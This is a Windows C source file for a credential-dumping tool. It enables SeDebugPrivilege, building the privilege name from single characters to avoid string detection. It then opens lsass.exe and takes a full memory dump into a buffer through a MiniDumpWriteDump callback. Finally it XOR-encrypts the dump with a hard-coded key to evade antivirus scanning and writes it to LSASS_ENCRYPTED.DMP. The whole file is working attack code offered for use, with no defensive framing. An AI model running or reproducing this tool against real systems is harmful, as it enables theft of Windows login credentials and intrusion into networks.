#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#pragma comment(lib, "Dbghelp.lib")

// Global variables the will hold the dump data and its size
LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 200); // Allocate 200MB buffer on the heap
DWORD dumpSize = 0;

// Callback routine that we be called by the MiniDumpWriteDump function
BOOL CALLBACK DumpCallbackRoutine(PVOID CallbackParam, const PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
	LPVOID destination = 0;
	LPVOID source = 0;
	DWORD bufferSize = 0;
	switch (CallbackInput->CallbackType) {
	case IoStartCallback:
		CallbackOutput->Status = S_FALSE;
		printf("[+] Starting dump to memory buffer\n");
		break;
	case IoWriteAllCallback:
		// Buffer holding the current chunk of dump data
		source = CallbackInput->Io.Buffer;
		
		// Calculate the memory address we need to copy the chunk of dump data to based on the current dump data offset
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)CallbackInput->Io.Offset);
		
		// Size of the current chunk of dump data
		bufferSize = CallbackInput->Io.BufferBytes;

		// Copy the chunk data to the appropriate memory address of our allocated buffer
		RtlCopyMemory(destination, source, bufferSize);
		dumpSize += bufferSize; // Incremeant the total size of the dump with the current chunk size
		
		//printf("[+] Copied %i bytes to memory buffer\n", bufferSize);
		
		CallbackOutput->Status = S_OK;
		break;
	case IoFinishCallback:
		CallbackOutput->Status = S_OK;
		printf("[+] Copied %i bytes to memory buffer\n", dumpSize);
		break;
	}
	return TRUE;
}

// Simple xor routine on memory buffer
void XOR(char* data, int data_len, char* key, int key_len)
{
	int j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1)
			j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}

// Enable SeDebugPrivilige if not enabled already
BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		printf("[-] Could not get current process token with TOKEN_ADJUST_PRIVILEGES\n");
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	char sPriv[] = { 'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e',0 };
	if (!LookupPrivilegeValueA(NULL, (LPCSTR)sPriv, &TokenPrivileges.Privileges[0].Luid)) {
		CloseHandle(hToken);
		printf("[-] No SeDebugPrivs. Make sure you are an admin\n");
		return FALSE;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		printf("[-] Could not adjust to SeDebugPrivs\n");
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}

// Find PID of a process by name
int FindPID(const wchar_t* procname)
{
	int pid = 0;
	PROCESSENTRY32 proc = {};
	proc.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	bool bProc = Process32First(snapshot, &proc);

	while (bProc)
	{
		if (wcscmp(procname, proc.szExeFile) == 0)
		{
			pid = proc.th32ProcessID;
			break;
		}
		bProc = Process32Next(snapshot, &proc);
	}
	return pid;
}

int main(int argc, char** argv) 
{
	// Find LSASS PID
	printf("[+] Searching for LSASS PID\n");
	int pid = FindPID(L"lsass.exe");
	if (pid == 0) {
		printf("[-] Could not find LSASS PID\n");
		return 0;
	}
	printf("[+] LSASS PID: %i\n", pid);
	
	// Make sure we have SeDebugPrivilege enabled
	if (!SetDebugPrivilege())
		return 0;

	// Open handle to LSASS
	HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
	if (hProc == NULL) {
		printf("[-] Could not open handle to LSASS process\n");
		return 0;
	}

	// Create a "MINIDUMP_CALLBACK_INFORMATION" structure that points to our DumpCallbackRoutine as a CallbackRoutine
	MINIDUMP_CALLBACK_INFORMATION CallbackInfo = { 0 };
	CallbackInfo.CallbackRoutine = DumpCallbackRoutine;

	// Do full memory dump of lsass and use our CallbackRoutine to handle the dump data instead of writing it directly to disk
	BOOL success = MiniDumpWriteDump(hProc, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
	if (success) {
		printf("[+] Successfully dumped LSASS to memory!\n");
	} else {
		printf("[-] Could not dump LSASS to memory\n[-] Error Code: %i\n", GetLastError());
		return 0;
	}

	// Xor encrypt our dump data in memory using the specified key
	char key[] = "11223344556";
	printf("[+] Xor encrypting the memory buffer containing the dump data\n[+] Xor key: %s\n", key);
	XOR((char*)dumpBuffer, dumpSize, key, sizeof(key));

	// Create file to hold the encrypted dump data
	HANDLE hFile = CreateFile("LSASS_ENCRYPTED.DMP", GENERIC_ALL, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	
	// Write the encrypted dump data to our file
	DWORD bytesWritten = 0;
	WriteFile(hFile, dumpBuffer, dumpSize, &bytesWritten, NULL);
	printf("[+] Enrypted dump data written to \"LSASS_ENCRYPTED.DMP\" file\n");
}